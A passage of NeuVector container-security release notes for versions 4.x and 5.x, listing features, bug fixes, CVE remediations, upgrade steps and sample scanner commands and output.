fixed.  4.2 March 2021​  Enhancements​  Multi-cluster Monitoring. Centralized visibility of the security posture of all managed clusters, by displaying the risk score and cluster summary for each cluster on multi-cluster management page. Note: multi-cluster federation requires a separate license.Add support for IBM Cloud integrated usage-based billing.Enhance PCI compliance report to show asset view , listing vulnerabilities by service.Add summary of scan result before listing the vulnerability.Support Red Hat OVAL2 database required for Red Hat Vulnerability Scanner certification.Support Red Hat OpenShift beta version of CIS benchmarks ('inspired by CIS'). This will be finalized when the CIS.org publishes the official version. This feature is supported for deployments of OpenShift version 4.3+.Allow API query filtering to check for conditions such as images allowed or denied using API calls.Add support for CIS Kubernetes benchmark 1.6.0.Report and display Image Modules detected during scan in scan results. This is shown in a tab in Image Scan results, and included in scan results from REST API.Allow editing of filters in registry, group, and response rule configurations through console.Update ConfigMap to add group_claim in oidcinitcfg.yaml and samlinitcfg.yaml, and Xff_Enabled in sysinitcfg.yamlAPI's yaml is updated for 4.2 in Automation section.  Bug Fixes​  Enforcer is unable to join existing cluster, sometimes taking 10 minutes in cases where there are too many enforcers registered. This is when enforcers are terminated ungracefully but still registered for license checks, preventing other enforcers from joining when the license limit is reached.Fixed: wildcard DNS traffic blocked. Improved the caching of dns results matching to wildcard dns address group.Fix rare condition where CRD certificates gets out of sync for webhook and controller.Correct legend in Network Activity display for 'Unmanaged' to 'Nodes'.Nodes detected as workload resulting in implicit violations.  Other​  Jenkins Plugin enhancements: Overwrite vulnerability severity by score.Add error messages to the JAVA exceptions hudson.AbortException. Update Helm chart to 1.7.1.  Please see release notes section Integrations &amp; Other Components for details.  4.1.2 February 2021​  Enhancements​  Enable toggling for XFF-forwarding to disable the NeuVector policy from using it, which is enabled by default. This is related to a function added in 4.1.1 to add support for x-forwarded-* headers. To disable, go to Settings -&gt; Configuration. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR below.  Bug Fixes​  Fixed that CVE-2020-1938 is not detected.Fix error from Manager &quot;Failed to export configurations of section {policy, user, config}.&quot;Fix Network Activity Graph filter is not working.Improve controller CPU and memory consumption.  Other​  Jenkins plug-in updated to support stand alone scanner. Please see release notes section Integrations &amp; Other Components for details.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;  Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. In 4.1.0 release, we added a feature to recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  In 4.1.2, switch is added to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.    4.1.1 January 2021​  Bug Fixes​  Add support for AWS EKS AMI Release v20210112 to fix ulimit issues.  4.1 December 2020​  Enhancements​  Allow users to change policy mode when exporting CRD.OIDC support claims from /oauth/userinfo endpoint.Cluster node refresh support to allow temporary support for node growth and migration of pods between nodes.Generate a usage report for download from the Settings -&gt; Configuration page.Wildcard support on namespace when assigning user roles to namespace.Improve group/policy removal logic. Configurable setting for when an unused group is removed based on the amount of time since it was last used.Allow user to configure packet capture duration.Add support for Multi-cluster management reader role.Stand alone scanner now submits scan result using REST API. See below for Scanner Details.Detect and block Man-in-the-middle attack reported in CVE-2020-8554.Add support for metered (usage based) licensing models.Remove step for creation of CRDs (e.g. NvSecurityRule) from the sample deployment yamls for Kubernetes and Openshift. This is not required (Controller will create these automatically). Helm deployment will also take care of these.  Bug Fixes​  Improve high memory usage on controller and enforcer.Error returned when trying to configure a registry filter. Allow wildcard be used any place in the repo/tag filter.Block policy not working as expected. Add support for x-forwarded-* headers. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR above as part of the 4.1.2 release notes.Helm Chart error when setting controller ingress to true.Unable to create add and save network rule, due to gateway timeout.Configmap examples are missing Group_Claim field. Added to configmap documentation.Process profile violation when terminating Controller pod.  Scanner Details​  Two additional environment variables are added in order to login to controller REST API. Users with CICD integration role can submit the results.  New Environment Variables: SCANNER_CTRL_API_USERNAME, SCANNER_CTRL_API_PASSWORD  Usage Example  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_LICENSE=$license -e CLUSTER_JOIN_ADDR=10.1.2.3 CLUSTER_JOIN_PORT=32368 -e SCANNER_CTRL_API_USERNAME=username -e SCANNER_CTRL_API_PASSWORD=secret -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   Kubernetes 1.19+ and CRD Exports​  important To use an exported CRD with Kubernetes 1.19+, please remove the 'version: v1' from each section. This can be found at the end or near the end of each section in an exported Group policy CRD.   version: v1   4.0.3 December 2020​  Bug Fixes​  Process profile violation occurring when terminating Controller pod.Implicit violations for user created address group which uses wildcard in hostnames.  Helm Chart Changes​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.Create a separate chart for CRD. This allows CRD policies to be created before NeuVector core services are deployed. If the new chart is used, the CRD resources in the core chart, kept for backward compatibility, should be disabled with crdwebhook.enabled=falseAllow user to specify the service account for NeuVector deployment. Previously, the 'default' service account of the namespace is used. In the case when NeuVector is deployed together with other applications in a namespace, it is not advisable to use the default service account for the namespace for some users.  4.0.2 December 2020​  Enhancements​  Console - the container list page Assets -&gt; Containers should allow the window separators to be dragged to be resized.Add admission control checks for pod share host namespaces. Allow user to choose to prevent pod from sharing host's Network, IPC, PID namespaces. See below for more details.Ability to export list of containers running in privileged or 'runasroot'.In Notifications -&gt; Security Events, enable the display of information about the event attributes easily without switching screens.  Bug Fixes​  Issue with jumbo frames (enabled on some public clouds). Symptom: the main prometheus application URI /graph becomes inaccessible when the prometheus group is placed into Protect mode.Missing namespace option in vulnerabilities filter. Allow users to select/type the Namespace where NeuVector is installed as filter entry.False positive in OpenSSL version 1.1.1c-1 affected by CVE-2020-1967.Unexpected implicit deny violations for user created address group using wildcard hostnames. Problems with using DNS Name (with wildcards) for Firewall Traffic.Improve detection to remove SQL Injection false positive.  Admission Control for Pod Sharing​  HostPID - Controls whether the pod containers can share the host process ID namespace. Note that when paired with ptrace this can be used to escalate privileges outside of the container (ptrace is forbidden by default).HostIPC - Controls whether the pod containers can share the host IPC namespace.HostNetwork - Controls whether the pod may use the node network namespace. Doing so gives the pod access to the loopback device, services listening on localhost, and could be used to snoop on network activity of other pods on the same node.  4.0.1 November 2020​  important Changes to Helm Chart Structure The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/ If using Helm to upgrade, please update the location to the path above.  Enhancements​  Add support for distroless image scanning.Add ability to trigger single image scan from registry with results available for admission control.Update JFrog Xray integration to new JFrog platform api / authentication requirements.Add information about scanners in the Manager such as version and scanner statistics.Add quick filter to exclude security events (similar to grep -v).Update CVE Severity to align with NVD vulnerability severity ratings. Using the larger of the CVSS v2 and v3 scores, the ratings are High for &gt;=7, Medium for &gt;=4.Support standalone scanner deployments for local image scanning (does not require controller). Adds new environment variables SCANNER_LICENSE, SCANNER_REGISTRY, SCANNER_REPOSITORY, SCANNER_TAG, SCANNER_REGISTRY_USERNAME, SCANNER_REGISTRY_PASSWORD, SCANNER_SCAN_LAYERS, CLUSTER_JOIN_ADDR, CLUSTER_JOIN_PORT.Support namespace auto-complete for namespace user creation in Settings -&gt; Users.Add ability to enter exempted CVEs in the Jenkins scanner plug-in.Add admission control criteria to be able to block images for which the scan failed to detect the OS (e.g. archlinux images) and therefore no vulnerabilities were found. A new criteria &quot;Image Without OS information&quot; is added, when set to true, means the base OS of the image is unavailable.  Bug Fixes​  Improve (decrease) Controller memory usage.Enable support for webhook functions such as admission control and CRD in Kubernetes 1.19.Add support for apiextensions.k8s.io/v1 deployments as required for Kubernetes 1.19 (and supported in k8s 1.18).Unexpected process profile rule violation resulting from parent shell script for process on the allowed list.Add support for wildcard filters in Harbor registry (configured using Docker registry setting).Improve handling of configmap to re-load if admin password is reverted to the default. This is to prevent insecure access when the system is recovered from cluster level storage failure.  4.0.0.s1 October 2020​  Security Patch for NeuVector Containers​  This security release is for the NeuVector Manager and Allinone containers to address High CVE-2020-14363 found in the base Alpine layer in package libx11. As part of the update, Medium CVE-2020-8927 is also addressed. This issue, although unlikely to be able to be exploited, affects the Manager console for NeuVector and does not affect the operations of the Controller or Enforcer containers.  4.0 September 2020​  Enhancements​  Customizable compliance templates. Preset templates for PCI, GDPR, HIPAA, NIST. Each CIS benchmarks and custom check can be tagged with one or more compliance regulations. Reports can then be generated for each. Security Risks -&gt; Compliance Profile.Vulnerability Management Workflow Support. Track status of vulnerabilities and create policies based on vulnerability discovery dates and other criteria. Security Risks -&gt; Vulnerabilities (Advanced Filter), and Admission Control rules.Secrets auditing. 20+ secrets checks included, and automatically run on image scans and resource yamls. Results will show pass/warn in the compliance reports on image vulnerabilities in Assets -&gt; Registries and Security Risks -&gt; Compliance.Granular RBAC for NeuVector Users. Create custom roles with granular read/write permissions for NeuVector functions. Assign users to roles. Settings -&gt; Users/Roles.Scalable and Separated Scanner Pods. Scanner pods can be scaled up or down to scan thousands of images. The controller assigns scanning tasks to each available scanner pod. Important: the Controller no longer contains a scanner function, so a minimum of one scanner pod is required to be deployed. Also, the 4.x scanners are NOT backward compatible with 3.x controllers, 3.x deployments of external scanners should be updated to neuvector/scanner:3.Serverless Scanning and Risk Assessment for AWS Lambda. Scan AWS Lambda functions for vulnerabilities with the Serverless IDE Plug-in or in AWS accounts. Supported languages include Java, Python, Ruby, node.js. Perform risk assessment by evaluating IAM role permissions for Lambda functions and alert if unnecessary permissions are enabled. Note: Serverless security requires a separate NeuVector license.Perform compliance checks during image scanning. Also deployment yamls file. This includes setuid, setgid, CIS (running as root etc), 20+ secrets checks.Enhance Security Risk Score in Dashboard with ability to enable/disable which Groups contribute to the Risk Score. Policy -&gt; Groups -&gt; Scorable check box. This includes ability to disable system containers from risk scoring.Added support for a Namespace restricted user to have access to assigned registries.Break out scanning syslog notifications to individual CVE syslog events.Allow a namespace restricted user to be able to create registries that are only visible by users that have access to that namespace (including global users).Download pdf reports from the dashboard by namespace. Select a namespace to filter the dashboard pdf report.The CRD import behavior has been changed to ignore the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration. A 'linked' group is one which has not been selected for export but is referred to by a network rule, and thus has been exported along with the selected group(s).  Bug Fixes​  Registry URL validation allows URL without protocol scheme prefix. Added protocol schema validation.Container scans failed - Fail to read files in some situations. Fixes error &quot;Failed to read file - error=&lt;nil&gt;&quot;.The Group member column is inaccurate for the special group &quot;nodes.&quot;Discount (reduce) Admission Controls (4 points) from Overall Risk Scoring for Docker EE Platform since it is not applicable.A scanner only controller can take 15-20 minutes to become ready.Security risks &gt; Vulnerabilities &quot;Severity&quot; Distribution title is mislabeled as Urgency.Security Events source Workload:ingress rule does not match. Unexpected implicit violation from Workload:Ingress on OpenShift 3.11 platform. Internal subnet logic is improved to handle large IP range.Enforcer reports error trying to connect to /var/run/docker.sock. Add recovery if connection is lost.  Summary of Major Operational Changes​  The 4.x Scanner is NOT compatible with the 3.2.0, 3.2.1, 3.2.2 Controllers. If you have deployed 3.x external scanners and wish to have them continue to run, be sure to UPDATE the scanner deployment with a version 3 tag, e.g. neuvector/scanner:3. Alternatively, you can update to 3.2.3+.License to enable serverless security requiredNew clusterolebinding and clusterrole added for Kubernetes an OpenShiftController no longer has built in scanner. You must deploy at least 1 scanner pod.Yaml file changes in main deployment samples: Added deployment for scanner pods (2 default)Scanner pod deployment has commented out section for local scanning casesAdded cron job for updater pod for cve database updates of scanners  Upgrading from 3.x to 4.0​  For Helm deployments, update the helm chart to the new version 1.6.0. Then a standard upgrade to 4.0.0 is all that is required (e.g. helm upgrade my-release --set imagePullSecrets=regsecret-neuvector,tag=4.0.0 ./neuvector-helm/).  tip Kubernetes (for OpenShift use the equivalent oc commands)  Backup the configuration from Settings -&gt; ConfigurationCreate the two new bindings kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:defaultkubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector Set the version tags to 4.0.0 for the Controller, Manager, Enforcer yaml's and apply the updateCreate the scanner podsCreate or update the scanner cron jobWait a few minutes for the rolling update of the controllers to complete, and check all settings after login... ","version":"5.3","tagName":"h3"},{"title":"5.x Release Notes","type":0,"sectionRef":"#","url":"/releasenotes/5x","content":"","keywords":"","version":"5.3"},{"title":"Release Notes for 5.x​","type":1,"pageTitle":"5.x Release Notes","url":"/releasenotes/5x#release-notes-for-5x","content":" note To receive email notifications of new releases, please subscribe to this SUSE mailing list: https://lists.suse.com/mailman/listinfo/neuvector-updates  5.3.3 June 2024​  Enhancements​  Allow users to block the usage of specific storage classes from the Admission Controls page.The LDAP Authentication has separated fields for baseDN and groupDN configuration.The Egress and Ingress chart has a new vulnerability column which contains the High and Medium vulnerability count for each service.  Bug Fixes​  Fixed bug related to regex when using a comma (,) in a multi-entry Admission Control user criteria.Fixed bug where the CVE scan of jar packages would not show all packages affected by a same CVE. Now all occurences are reported.  Other​  Allow users to set resources for updater-cron-job when installing NeuVector with the Helm chart.Prometheus exporter container versioning reviewed and dissociated to the controller versioning.(Scanner) Detect the R package/module in Ubuntu and Red Hat Enterprise Linux.(Scanner) Added support for PHP Composer scan.  5.2.4-s3 April 2024​  Remediates following CVEs:  CVE\tApplies to\tImpact CVE-2021-40633\tgiflib\t🔴 High CVE-2023-48161\tgiflib\t🔴 High CVE-2024-28757\texpat\t🔴 High CVE-2023-39742\tgiflib\t🟠 Medium CVE-2023-45288\tgo:golang.org/x/net\t🟠 Medium CVE-2024-25629\tc-ares\t🟠 Medium CVE-2024-3651\tpython:idna\t🟠 Medium CVE-2024-2511\topenssl\t🟡 Low  5.3.2 April 2024​  Bug Fixes​  After upgrading to v5.3.1 from a previous NeuVector release, pre-existing NvClusterSecurityRule custom resources may be deleted inadvertently. NOTE: The 5.3.1 version has been removed from docker hub in order to prevent the upgrade issue.  5.3.1 April 2024​  important The 5.3.1 version has been removed from docker hub in order to prevent the upgrade issue fixed in 5.3.2. Please use the 5.3.2 release.  Enhancements​  Allow users to define ‘accepted’ vulnerabilities when using Github actions so they don’t affect workflows.Add Severity, Score level and Feed Rating filters to Assets &gt; Registry &gt; Image Vulnerabilities view.Allow when configuring a registry if it should use the defined proxy for the registry image scans.  Bug Fixes​  Security Risks &gt; Vulnerabilities &gt; Advanced Filter doesn't filter 'CVE without Fix'Unexpected violation from container to hostmode containerAccept OCI image format when switching to docker api 1.24Registry Scan should not scan non-image artifacts / not log an errorAllow for rootless key pair image signature verification without internet or sigstore dependence.Security Events not getting permitted by network rules in a specific node (related to &quot;Container Task chan full&quot; error messages)Container is unable to add to workload successfully (frequent occurences). Resulting from deadlock from channel messages.  Other​  Update the scanner plugins for Jenkins, GitHub action, and Bamboo.(Scanner) Accept OCI image format when switching to docker api 1.24.(Scanner) Registry Scan should not scan non-image artifacts / not log an error.(Scanner) Add support for php composer scan.  NeuVector UI Extension v. 1.0 for Rancher March 2024​  After installation of NeuVector, enabling/installing the NeuVector UI Extension from Rancher will display a Dashboard for the cluster, including links to SSO to the full NeuVector cluster. NOTE: The extension may display as Third Party, which will be fixed in a future release. Also, after installation, Rancher 2.7.x users may see two NeuVector UI Ext icons in the list (bug). One icon will say Uninstall (meaning it is installed), and the other should say Install. This can be left as is, ie, don't Install again if the extension is already installed.  5.2.4-s2 February 2024​  Remediates following CVEs:High cve: CVE-2023-52425 in expat, CVE-2024-20952 and CVE-2024-20918 in openjdk11Med cve: CVE-2023-52426 in expat, CVE-2024-20926, CVE-2024-20921, CVE-2024-20945 and CVE-2024-20919 in openjdk11, CVE-2024-0727 and CVE-2023-6237 in openssl  5.3.0 February 2024​  #####Enhancements  Show external destination URLs (FQDN) in Dashboard (egress), PDF and CSV reports, as we well as in Network Activity screen and Security Events (violations) listsIn Discover mode, learn egresses to external FQDN address groups automatically. A new external FQDN custom group will be created unless the external connection matches an existing rule.Enable ICMP learning (Discover mode) and blocking (Protect mode) through new Controller environment variable CTRL_EN_ICMP_POLICY = 1Export CRDs into Github to support gitops to a default repo using console or REST API.Support SAML SSO single logout with ADFS iDPAdd support for ARM64 platform. Pulling from ARM based platforms will automatically pull the appropriate ARM64 NeuVector images.Support webhooks through a proxyImprove admission control auditing function to include results of all rules. List the result of every rule, and adds another entry for the final action the would occur when evaluated in a live admission control deployment.Apply disabled Admission Control rules via CRD or yaml (kubectl)Vulnerability Profile export / import through console, CRD, or REST API. Importing will replace the existing profile. Deleting the CRD will result in an empty profile.Compliance Profile template export / import through console, CRD, or REST API. Importing will replace the existing template.Add a 'Manual' status in the compliance reports for CIS benchmarks that must be run manually by users (not run by NeuVector).Improve UI loading/performance of Vulnerabilities pageUnify browser session login. With this, all tabs in the browser share the same login session, opening a new tab from an existing session does not ask for credentials, and when one tab logs out, all tabs are logged out.Enhancements to security of console (UI): 1) add mandatory security headers (X-Content-Type-Options nosniff; X-XSS-Protection 1; mode=block; X-Frame-Options SAMEORIGIN; Cache-Control private, no-cache, no-store, must-revalidate HTTP Strict Transport Security max-age=15724800, 2) add CSP header (e.g. set a ‘default-src’ directive), 3) remove server name disclosureSupport newer versions of CIS benchmarks. Kubernetes (1.8.0), Kubernetes V1.24 (1.0.0), Kubernetes V1.23 (1.0.1), RedHat OpenShift Container Platform (1.4.0)Show in Assets -&gt; Containers -&gt; Container details containers which were scanned in registries versus runtimeAdd link to Group in Security Risks -&gt; Vulnerabilities -&gt; Impact popup to easily edit group modeSupport deep linking in URL's to image and/or container vulnerability pageAdd password reset option for admin to reset user password in console Settings -&gt; UsersAllow sending event logs to controller pod logs in Settings -&gt; Configuration -&gt; Notification. The events sent will begin with 'notification=' and be saved only to the leader controller pod. Note that there is a bug in this version where, in order to change the event level SYSLOG must be enabled (and can be disabled if desired after changing the level).Remove requirement for controller/enforcer to mount &quot;/host/cgroup&quot;.Add Get Support menu with links to slack, documentation, and other resourcesFill message field to /v1/log/activity logs  #####Bug Fixes  Internal Server Error in Security Risks -&gt; Vulnerabilities with a high number of CVEsSIGSEGV: segmentation violation on controllerDeleting vulnerable files (e.g. jar) doesn't remove from vulnerability listInvalid Syslog certificate using the signature algorithm SHA256withECDSANeuVector shows security events that should be allowed by a Network RuleUn-managed node with &quot;zombie&quot; enforcer runningAdvanced Filter shows Remediation and Impact fields blankFix string handling to prevent unexpected Enforcer restartUnexpected violations relating to built-in groupsSupport-bundle enforcer debug RPC call for data returns errorGroup is not matching in Security EventsSend events to slack is not working - with proxyShowing security events for allowed network rules  #####Other  Add run-time container engine (socket) automatic detection to Helm chartRemove setting for running controller in privileged mode in Helm chart, and requirement for controller/enforcer to mount &quot;/host/cgroup&quot;.The sample kubernetes deployment files have been removed from the NeuVector docs. Please refer to the link for examples.  #####Highlighted Changes Which May Require Changes for Manual Deployments (all changes are already reflected in latest Helm chart for 5.3.x)  Auto detection of container run-time (socket) removes the need to specify the container run-time and socket path.Removal of requirement to run the controller in privileged mode removes the need for mounting runtime socket and mounted /host/cgroup/Added role/role binding for neuvector-binding-secret as well as neuvector-secret in yaml.New service accounts and role bindings required for 5.3All referenced deployment yaml files now have /5.3.0/ in their paths  5.2.4-s1 January 2024​  Security Patch Release​  Remediates CVE-2023-6129 in openssl, and CVE-2023-46219, CVE-2023-46218 in curl.  5.2.4 November 2023​  Bug Fixes​  Azure AKS ValidatingWebhookConfiguration changes and error logging.  5.2.3 November 2023​  Enhancements​  Add support for NVD API 2.0 in Scanner.Scan the container host in scanner standalone mode.  docker run --rm --privileged --pid=host neuvector/scanner -n   Bug Fixes​  Scan on a node fails due to deadlocked docker cp / grpc issue.  5.2.2-s1 October 2023​  Security Update​  Update packages to remediate CVEs including High CVE-2023-38545 and CVE-2023-43804.  5.2.2 October 2023​  Security Advisory for CVE-2023-32188​  Remediate CVE-2023-32188 “JWT token compromise can allow malicious actions including Remote Code Execution (RCE)” by auto-generating certificate used for signing JWT token upon deployment and upgrade, and auto-generating Manager/RESTful API certificate during Helm based deployments. Certificate for JWT-signing is created automatically by controller with validity of 90days and rotated automatically.Auto-generation of Manager, REST API, and registry adapter certificate requires using Helm-based install using NeuVector helm version 2.6.3 or later.Built-in certificate is still used for yaml based deployments if not replaced during deployment; however, it is recommended to replace these (see next line).Manual replacement of certificate is still supported and recommended for previous releases or yaml based deployments. See the NeuVector GitHub security advisory here for a description.Use of user-supplied certificates is still supported as before for both Helm and yaml based deployments. Add additional controls on custom compliance scripts. By default, custom script are now not allowed to be added, unless the environment variable CUSTOM_CHECK_CONTROL is added to Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).Prevent LDAP injection - username field is escaped.  Enhancements​  Add additional scan data to CVE results sent by SYSLOG for layered scansSupport NVD API 2.0 for scan CVE databaseProvide container image build date in Assets -&gt; Container detailsAdjust sorting for Network rules: disable sorting in Network rules view but enable sorting of network rules in Group view.Enable/disable TLS 1.0 and TLS 1.1 detection/alerting with environment variables to Enforcer THRT_SSL_TLS_1DOT0, THRT_SSL_TLS_1DOT1. Disabled by default.Add environment variable AUTO_PROFILE_COLLECT for Controller and Enforcer to assist in capturing memory usage when investigating memory pressure events. Set value = 1 to enable.Configuration assessments against Admission Control should show all violations with one scan.Add more options for CVE report criteria in Response Rules. Example 1 - &quot;cve-high-with-fix:X&quot; means: When # of (high vulnerability that have been fixed) &gt;= X, trigger the response rule. Example 2 - &quot;cve-high-with-fix:X/Y&quot; means: When # of (high vulnerability that were reported Y days ago &amp; have been fixed) &gt;= X, trigger the response rule.  Bug Fixes​  Export of group policy does not return any actual YAML contentsImprove pruning of namespaces with dedicated functionNeuVector namespace user cannot see assets--&gt;namespacesSkip handling the CRD CREATE/UPDATE requests if the CR's namespace is already deletedProvide workaround for part of CRD groups which cannot be pruned successfully after namespaces are deleted.  5.2.1 August 2023​  Enhancements​  Report layered scan results and additional CVE data in SYSLOG messages. This is enabled through a checkbox in Settings -&gt; Configuration -&gt; SYSLOGExport NIST 800-53 mappings (to docker CIS benchmarks) in the exported csv compliance reportSupport Proxy setting in image signature verificationInclude image signature scan result in the downloaded CVE reportSupport pod annotations for Admission Control Policies, available through the Custom criteriaAdd Last Modified field to filter for vulnerabilities report printing, as well as Advanced Filter in Vulnerabilities view  Bug fixes​  Do not create default admin with default password in initial NeuVector deployment for AWS billing (CSP adapter) offering, requiring user to use a secret to create admin username and passwordFix .json file which increased size and crashed a kubernetes nodeImprove SQL injection detection logicWhen installing the helm crd chart first before installing the NeuVector core chart, service accounts are missingImage scan I.4.1 compliance result is incorrectVulnerability advanced filter report showing images from all other namespace  5.2.0 July 2023​  Enhancements​  Support tokens for NeuVector API access. See Settings -&gt; User, API Keys... to create a new API key. Keys can be set to default or custom roles.Support AWS Marketplace PAYG billing for NeuVector monthly support subscriptions. Users can subscribe to NeuVector by SUSE support, billed monthly to their AWS account based on previous month's average node count usage. Details here.Support image signing for admission controls. Users can require NeuVector to verify that images are signed by specific parties before they can be deployed into the production environment, through an integration with Sigstore/Cosign. See Assets -&gt; Sigstore Verifiers for creating new signature assets. Rules can then be created with criteria Image Signing and/or Image Sigstore Verifiers.Enable each admission control rule to have its own mode of Monitor or Protect. A Deny action in Monitor mode will alert, and a Deny action in Protect mode will block. Allow actions are unaffected.Add a new regex operator in Policy &gt; Admission Control &gt; Add Rule for Users and User Groups to support regex. Support operators &quot;matches ANY regex in&quot; and &quot;matches NONE regex in&quot;.Add support for admission control criteria such as resource limits. A new criteria is added for Resource Limits, and additional criteria are supported through the Custom Criteria settings.Support invoking NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters. NOTE: There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).Searchable SaaS service for CVE lookups. Search the latest NeuVector CVE database to see if a specific CVE exists in the database. This service is available for NeuVector Prime (paid support subscription) customers. Contact support through your SCC portal for access.Allow user to disable network protection but keep WAF/DLP functioning. Configure Network Policy Enablement in Settings -&gt; Configuration.Use less privileged services accounts as required for each NeuVector component. A variable “leastPrivilege” is introduced. The default is false. NOTE: Using the current helm chart with this variable on a release prior to 5.2.0 will not function properly.Bind to non-default service account to meet CIS 1.5 5.1.5 recommendation.Enable administrator to configure user default Session Time out in Settings -&gt; Users, API Keys &amp; Roles.Customizable login banner and customizable UI header text for regulated and government deployments. Requirements for configuration can be found here.SYSLOG support for TLS encrypted transport. Select TCP/TLS in Settings -&gt; Configuration for SYSLOG.Enable deployment of the NeuVector monitor helm chart from Rancher Manager.Remove upper limit for top level domain in URL validator for registry scanning.Scan golang dependencies, including run-time scans.Support Debian 12 (Bookworm) vulnerability scan.Add CSV export for Registry / Details to export CVEs for all images in configured registry in Assets -&gt; Registries for a selected registry.Allow NeuVector to set several ADFS certificates in parallel in x.509 certificate field.Add and display the comment field for Response Rules.Specify what NeuVector considers to be system containers through environment variable. For example, for Rancher and default namespaces: NV_SYSTEM_GROUPS=*cattle-system;defaultAdd support for Kubernetes 1.27 and OpenShift 4.12  Bug Fixes​  Reduce repeating logs in enforcer/controller logs.Multiple clusters page does not render.Empty group auto-removal takes 2 hours to delete instead of 1 hour according to schedule.Manually allowed network rule not getting applied and resulting in violation for pause image.Blocking SSL connections even if a network rule permits the traffic under certain initial conditions.Security events warning even with allowed network rules due to policy update issue in synchronization.Network Activities wrongly associating custom group traffic to external.Default service account token of the namespace mounted in each pod is too highly privileged.Despite defining the network rules, violations getting logged under security events (false positives) when the container has stopped due to out of memory (OOM) error.Allow user to disable/enable detection and protection against unmanaged container in cluster. This can be set through the Manager CLI:  set system detect_unmanaged_wl status -h Usage: cli set system detect_unmanaged_wl status [OPTIONS] {true|false} Enable/disable detect unmanaged container   Other​  Add &quot;leastPrivilege&quot; setting in Helm chart. Add helm option for New_Service_Profile_Baseline. A new Helm chart (core) version is published for 5.2.Enable AWS Marketplace (billing adapter) integration settings in Helm chart.Update configmap to support new features (multiple ADFS certificates, zero drift, New_Service_Profile_Baseline, SYSLOG TLS, user timeout)Update supported Kubernetes versions to 1.19+, and OpenShift 4.6+ (1.19+ with CRI-O)  5.1.3 May 2023​  Enhancements​  Add new vulnerability feed for scanning Microsoft .NET framework.Enforcer stats are disabled by default in Prometheus exporter to improve scalability.Usability improvement: Using scanner to scan single image and print the result (see example below).Add imagePullPolicy check in admission control rules criteria.Show warning message when CRD schema is out of date.  Bug Fixes​  Network Activity screen does not render or incorrectly renders.Empty group auto-removal takes 2 hours to delete instead of 1 hour according to schedule.Compliance profile doesn’t show in UI console.Advanced Filter in Security Events Missing &quot;Error&quot; Level.Saved password with special character fails on future authentication attempt.Multiple clusters page does not render properly when requests are high.Registry detail (bottom) pane not updating.  Scanner Sample Output​  Image: https://registry.hub.docker.comlibrary/alpine:3.4 Base OS: alpine:3.4.6 TOTAL: 6, HIGH: 1, MEDIUM: 5, LOW: 0, UNKNOWN: 0 ┌─────────┬───────────────┬──────────┬───────────┬───────────────┬────────────┐ │ PACKAGE │ VULNERABILITY │ SEVERITY │ VERSION │ FIXED VERSION │ PUBLISHED │ ├─────────┼───────────────┼──────────┼───────────┼───────────────┼────────────┤ │ openssl │ CVE-2018-0732 │ High │ 1.0.2n-r0 │ 1.0.2o-r1 │ 2018-06-12 │ │ ├───────────────┼──────────┤ ├───────────────┼────────────┤ │ │ CVE-2018-0733 │ Medium │ │ 1.0.2o-r0 │ 2018-03-27 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0734 │ │ │ 1.0.2q-r0 │ 2018-10-30 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0737 │ │ │ 1.0.2o-r2 │ 2018-04-16 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0739 │ │ │ 1.0.2o-r0 │ 2018-03-27 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-5407 │ │ │ 1.0.2q-r0 │ 2018-11-15 │ └─────────┴───────────────┴──────────┴───────────┴───────────────┴────────────┘   5.1.2 March 2023​  Enhancements​  Support virtual host based address group and policy matching network protections. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.Compliance containers list to exclude exited containers.Enhance DLP rules to support simple wildcard in the pattern.Add support for cri-o 1.26+ and 